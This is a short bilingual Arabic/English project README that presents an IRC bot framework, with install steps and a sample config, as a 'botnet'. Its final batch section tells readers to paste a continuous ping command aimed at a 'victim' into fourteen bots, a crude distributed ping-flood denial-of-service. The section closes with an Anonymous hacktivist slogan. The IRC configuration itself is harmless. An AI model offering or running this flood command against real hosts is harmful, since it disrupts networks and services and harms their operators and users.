# Botnet بوتنت 
هناك في هذا المشروع 
بوتنتين 
بوتنت بايثون 
بوتنت باتش
اختر ماتشاء
انا افضل البايثون
لانه افضل


## Installation التنصيب

    pip install git+https://github.com/boreq/botnet
  

## Usage الاستخدام

    botnet --help
    botnet run --help
    botnet run /path/to/config.json



## الترتيب

يمديك إضافة مقتطفات التكوين من وصف الوحدة النمطية إلى `module_config`
مفتاح في ملف التكوين. هذا هو الهيكل العام لملف التكوين:

    {
        "modules": ["module_name1", "module_name2"],
        "module_config": {
            "namespace": {
                "module_name": {
                    "config_parameter": "value"
                }
            }
        }
    }


تستخدم كافة الوحدات النمطية مدمج مساحة الاسم `botnet`. وتستند معظم وحدات على
`BaseResponder` وحدة، وذلك لتغيير بادئة الأمر الافتراضي تغيير
`module_config.botnet.base_responder.command_prefix` مفتاح التكوين. انظر
مثال لتكوين التفاصيل.

## Example config مثال التــرتيــب

    {
        "modules": ["irc", "meta"],
        "module_config": {
            "botnet": {
                "irc": {
                    "server": "irc.example.com",
                    "port": 6697,
                    "ssl": true,
                    "nick": "my_bot",
                    "channels": [
                        {
                            "name": "#my-channel",
                            "password": null
                        }
                    ],
                    "autosend": [
                        "PRIVMSG your_nick :I connected!"
                    ]
                },
                "base_responder": {
                    "command_prefix": "."
                }
            }
        }
    }
    
#BATCH Version نسخة الباتش

للتشغيل السريع
افتح مجلد
bots
انسخ الامر التالي الى جميع البوتات


وهم 14 بوت

@ECHO off
color 04
ping -t victim -l packages

 We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
Expect us.
![alt tag](https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcTO2r44agGb_DleJVZGMrbn6G1djgMGrRyUo_kflBhHYfyn0JzH)
